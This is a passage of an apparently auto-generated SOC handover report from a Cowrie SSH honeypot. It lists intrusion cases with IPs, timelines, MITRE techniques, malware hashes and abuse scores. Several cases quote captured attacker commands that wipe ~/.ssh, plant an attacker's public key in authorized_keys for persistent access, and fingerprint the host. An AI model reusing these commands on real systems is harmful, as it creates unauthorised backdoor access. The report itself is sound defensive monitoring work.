- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79708e10d82a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 19:55 |
| **Last Seen** | 2026-06-06 19:55 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:55:10` | `cowrie.session.connect` |
| `2026-06-06 19:55:10` | `cowrie.client.version` |
| `2026-06-06 19:55:10` | `cowrie.client.kex` |
| `2026-06-06 19:55:13` | `cowrie.login.success` |
| `2026-06-06 19:55:18` | `cowrie.session.params` |
| `2026-06-06 19:55:18` | `cowrie.command.input` |
| `2026-06-06 19:55:18` | `cowrie.command.failed` |
| `2026-06-06 19:55:18` | `cowrie.log.closed` |
| `2026-06-06 19:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a3a368e6a3

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 19:55 |
| **Last Seen** | 2026-06-06 19:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:55:32` | `cowrie.session.connect` |
| `2026-06-06 19:55:32` | `cowrie.client.version` |
| `2026-06-06 19:55:32` | `cowrie.client.kex` |
| `2026-06-06 19:55:34` | `cowrie.login.success` |
| `2026-06-06 19:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732bd7d4ff4b

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 20:00 |
| **Last Seen** | 2026-06-06 20:01 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}', ls -lh $(which ls)` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:00:11` | `cowrie.session.connect` |
| `2026-06-06 20:00:11` | `cowrie.client.version` |
| `2026-06-06 20:00:11` | `cowrie.client.kex` |
| `2026-06-06 20:00:15` | `cowrie.login.success` |
| `2026-06-06 20:00:17` | `cowrie.session.params` |
| `2026-06-06 20:00:17` | `cowrie.command.input` |
| `2026-06-06 20:00:17` | `cowrie.command.failed` |
| `2026-06-06 20:00:17` | `cowrie.log.closed` |
| `2026-06-06 20:00:20` | `cowrie.session.params` |
| `2026-06-06 20:00:20` | `cowrie.command.input` |
| `2026-06-06 20:00:20` | `cowrie.session.file_download` |
| `2026-06-06 20:00:20` | `cowrie.log.closed` |
| `2026-06-06 20:00:33` | `cowrie.session.params` |
| `2026-06-06 20:00:33` | `cowrie.command.input` |
| `2026-06-06 20:00:36` | `cowrie.log.closed` |
| `2026-06-06 20:00:53` | `cowrie.session.params` |
| `2026-06-06 20:00:53` | `cowrie.command.input` |
| `2026-06-06 20:00:53` | `cowrie.log.closed` |
| `2026-06-06 20:00:54` | `cowrie.session.params` |
| `2026-06-06 20:00:54` | `cowrie.command.input` |
| `2026-06-06 20:00:54` | `cowrie.command.input` |
| `2026-06-06 20:00:54` | `cowrie.log.closed` |
| `2026-06-06 20:00:54` | `cowrie.session.params` |
| `2026-06-06 20:00:54` | `cowrie.command.input` |
| `2026-06-06 20:00:55` | `cowrie.log.closed` |
| `2026-06-06 20:00:55` | `cowrie.session.params` |
| `2026-06-06 20:00:55` | `cowrie.command.input` |
| `2026-06-06 20:00:56` | `cowrie.log.closed` |
| `2026-06-06 20:00:56` | `cowrie.session.params` |
| `2026-06-06 20:00:56` | `cowrie.command.input` |
| `2026-06-06 20:00:56` | `cowrie.log.closed` |
| `2026-06-06 20:00:57` | `cowrie.session.params` |
| `2026-06-06 20:00:57` | `cowrie.command.input` |
| `2026-06-06 20:00:57` | `cowrie.log.closed` |
| `2026-06-06 20:00:58` | `cowrie.session.params` |
| `2026-06-06 20:00:58` | `cowrie.command.input` |
| `2026-06-06 20:00:58` | `cowrie.log.closed` |
| `2026-06-06 20:00:59` | `cowrie.session.params` |
| `2026-06-06 20:00:59` | `cowrie.command.input` |
| `2026-06-06 20:00:59` | `cowrie.log.closed` |
| `2026-06-06 20:00:59` | `cowrie.session.params` |
| `2026-06-06 20:00:59` | `cowrie.command.input` |
| `2026-06-06 20:01:00` | `cowrie.log.closed` |
| `2026-06-06 20:01:00` | `cowrie.session.params` |
| `2026-06-06 20:01:00` | `cowrie.command.input` |
| `2026-06-06 20:01:01` | `cowrie.log.closed` |
| `2026-06-06 20:01:01` | `cowrie.session.params` |
| `2026-06-06 20:01:01` | `cowrie.command.input` |
| `2026-06-06 20:01:01` | `cowrie.log.closed` |
| `2026-06-06 20:01:02` | `cowrie.session.params` |
| `2026-06-06 20:01:02` | `cowrie.command.input` |
| `2026-06-06 20:01:02` | `cowrie.log.closed` |
| `2026-06-06 20:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e819bf25a82

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 20:01 |
| **Last Seen** | 2026-06-06 20:06 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:01:14` | `cowrie.session.connect` |
| `2026-06-06 20:01:14` | `cowrie.client.version` |
| `2026-06-06 20:01:15` | `cowrie.client.kex` |
| `2026-06-06 20:01:17` | `cowrie.login.success` |
| `2026-06-06 20:01:18` | `cowrie.session.params` |
| `2026-06-06 20:01:18` | `cowrie.command.input` |
| `2026-06-06 20:01:18` | `cowrie.command.failed` |
| `2026-06-06 20:01:19` | `cowrie.log.closed` |
| `2026-06-06 20:01:28` | `cowrie.session.params` |
| `2026-06-06 20:01:28` | `cowrie.command.input` |
| `2026-06-06 20:01:29` | `cowrie.session.file_download` |
| `2026-06-06 20:01:29` | `cowrie.log.closed` |
| `2026-06-06 20:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05782123465

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 20:01 |
| **Last Seen** | 2026-06-06 20:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:01:33` | `cowrie.session.connect` |
| `2026-06-06 20:01:33` | `cowrie.client.version` |
| `2026-06-06 20:01:34` | `cowrie.client.kex` |
| `2026-06-06 20:01:38` | `cowrie.login.success` |
| `2026-06-06 20:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda331710910

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 20:04 |
| **Last Seen** | 2026-06-06 20:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:04:56` | `cowrie.session.connect` |
| `2026-06-06 20:04:56` | `cowrie.client.version` |
| `2026-06-06 20:04:57` | `cowrie.client.kex` |
| `2026-06-06 20:05:09` | `cowrie.login.success` |
| `2026-06-06 20:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee451448351

| Field | Detail |
|---|---|
| **Source IP** | `168.167.72[.]132` |
| **First Seen** | 2026-06-06 20:51 |
| **Last Seen** | 2026-06-06 20:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:51:44` | `cowrie.session.connect` |
| `2026-06-06 20:51:44` | `cowrie.client.version` |
| `2026-06-06 20:51:44` | `cowrie.client.kex` |
| `2026-06-06 20:51:45` | `cowrie.login.success` |
| `2026-06-06 20:51:46` | `cowrie.session.params` |
| `2026-06-06 20:51:46` | `cowrie.command.input` |
| `2026-06-06 20:51:46` | `cowrie.command.failed` |
| `2026-06-06 20:51:47` | `cowrie.log.closed` |
| `2026-06-06 20:51:47` | `cowrie.session.params` |
| `2026-06-06 20:51:47` | `cowrie.command.input` |
| `2026-06-06 20:51:47` | `cowrie.session.file_download` |
| `2026-06-06 20:51:47` | `cowrie.log.closed` |
| `2026-06-06 20:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.72[.]132` to AbuseIPDB if not already reported
- [ ] Block `168.167.72[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c033e124a51c

| Field | Detail |
|---|---|
| **Source IP** | `168.167.72[.]132` |
| **First Seen** | 2026-06-06 20:51 |
| **Last Seen** | 2026-06-06 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 20:51:51` | `cowrie.session.connect` |
| `2026-06-06 20:51:51` | `cowrie.client.version` |
| `2026-06-06 20:51:51` | `cowrie.client.kex` |
| `2026-06-06 20:51:52` | `cowrie.login.success` |
| `2026-06-06 20:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.72[.]132` to AbuseIPDB if not already reported
- [ ] Block `168.167.72[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.106[.]235` | **32** | 2026-06-06 19:29 | 2026-06-06 20:05 | 19m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.66.149[.]230` | **25** | 2026-06-06 20:02 | 2026-06-06 20:08 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.26.136[.]75` | **6** | 2026-06-06 19:45 | 2026-06-06 21:00 | 2m | 0 | `T1592` | 🟢 LOW |
| `41.216.177[.]55` | **6** | 2026-06-06 19:29 | 2026-06-06 19:41 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | 1 | 2026-06-06 19:43 | 2026-06-06 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `114.35.184[.]213` | 1 | 2026-06-06 19:43 | 2026-06-06 19:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `168.167.72[.]132` | 1 | 2026-06-06 20:51 | 2026-06-06 20:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.81.140[.]174` | 1 | 2026-06-06 19:42 | 2026-06-06 19:43 | 75s | 0 | `T1592` | 🟢 LOW |
| `20.83.158[.]130` | 1 | 2026-06-06 21:07 | 2026-06-06 21:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.36.78[.]66` | 1 | 2026-06-06 19:30 | 2026-06-06 19:32 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `114.35.184[.]213` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 9 |
| `103.66.149[.]230` | PK | Sambrial Cable | **100** ⚠️ | 1 |
| `120.48.106[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 21 |
| `103.26.136[.]75` | BD | GRAMEEN COMMUNICATIONS | **100** ⚠️ | 1 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `59.36.78[.]66` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `41.216.177[.]55` | ID | Atha media prima | **100** ⚠️ | 50 |
| `168.167.72[.]132` | BW | Botswana Telecommunications Corporation | **100** ⚠️ | 50 |
| `20.83.158[.]130` | US | Microsoft Corporation | **98** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 55 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 95 cases |
| Tool 34  | Credential Extractor        | ✅ 32 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (4.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 10 recon entry/entries in table (4 group(s) consolidating 69 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T21:09:15Z_
